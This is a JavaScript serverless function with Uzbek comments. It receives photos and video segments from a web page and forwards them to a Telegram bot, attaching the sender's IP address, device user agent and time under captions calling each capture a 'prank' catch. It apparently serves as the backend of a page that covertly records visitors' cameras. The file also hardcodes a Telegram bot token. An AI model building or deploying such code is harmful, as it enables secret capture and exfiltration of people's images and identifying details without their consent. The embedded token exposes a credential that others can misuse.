// Vercel Serverless Function: Surat va videoni qabul qilib Telegramga yuborish
const BOT_TOKEN = process.env.BOT_TOKEN || '8397655004:AAHz1xBd0vNNLRe9H-8krdFjZNi9btJW4GA';

// ⚠️ Bu config handler DAN KEYIN yozilishi shart — aks holda module.exports qayta yozadi
const handler = async (req, res) => {
  // CORS ruxsatnomalari
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Faqat POST so\'rov qabul qilinadi' });
  }

  try {
    const { chat_id, type, data, mimeType: clientMime } = req.body || {};

    if (!chat_id || !data) {
      return res.status(400).json({ error: 'chat_id va data talab qilinadi' });
    }

    // Base64 ma'lumotni ajratib olish
    let base64 = data;
    let mime = clientMime || (type === 'video' ? 'video/webm' : 'image/jpeg');

    if (data.includes(';base64,')) {
      const parts = data.split(';base64,');
      mime = parts[0].replace('data:', '') || mime;
      base64 = parts[1];
    }

    const buffer = Buffer.from(base64, 'base64');

    // Foydalanuvchi haqida ma'lumot
    const rawIp = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'Noma\'lum';
    const ip = String(rawIp).split(',')[0].trim();
    const ua = req.headers['user-agent'] || 'Noma\'lum';
    const time = new Date().toLocaleString('uz-UZ', { timeZone: 'Asia/Tashkent' });
    const segment = req.body.segment !== undefined ? ` | Segment #${req.body.segment}` : '';

    const icon = type === 'video' ? '🎥' : '📸';
    const caption =
      `${icon} <b>Yangi prank o'ljasi!${segment}</b>\n\n` +
      `📅 <b>Vaqt:</b> ${time}\n` +
      `🌐 <b>IP:</b> <code>${ip}</code>\n` +
      `📱 <b>Qurilma:</b> <i>${ua.substring(0, 100)}</i>`;

    const formData = new FormData();
    formData.append('chat_id', chat_id);
    formData.append('caption', caption);
    formData.append('parse_mode', 'HTML');

    if (type === 'video') {
      const ext = mime.includes('mp4') ? 'mp4' : 'webm';
      const blob = new Blob([buffer], { type: mime });
      formData.append('video', blob, `prank_video.${ext}`);

      // 1-urinish: sendVideo
      let tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
        method: 'POST',
        body: formData
      });
      let tgData = await tgRes.json();

      // Agar sendVideo format xatosi bersa, sendDocument orqali yuborish
      if (!tgData.ok) {
        const docForm = new FormData();
        docForm.append('chat_id', chat_id);
        docForm.append('caption', caption);
        docForm.append('parse_mode', 'HTML');
        docForm.append('document', blob, `prank_video.${ext}`);
        tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
          method: 'POST',
          body: docForm
        });
        tgData = await tgRes.json();
      }

      return res.status(200).json(tgData);
    } else {
      const blob = new Blob([buffer], { type: mime });
      formData.append('photo', blob, 'prank_photo.jpg');
      const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
      const tgData = await tgRes.json();
      return res.status(200).json(tgData);
    }
  } catch (err) {
    console.error('Yuklashda xatolik:', err);
    return res.status(500).json({ error: err.message });
  }
};

// ✅ Config handler ga biriktiriladi — module.exports qayta yozilganda saqlanadi
handler.config = {
  api: {
    bodyParser: {
      sizeLimit: '50mb',
    },
  },
};

module.exports = handler;
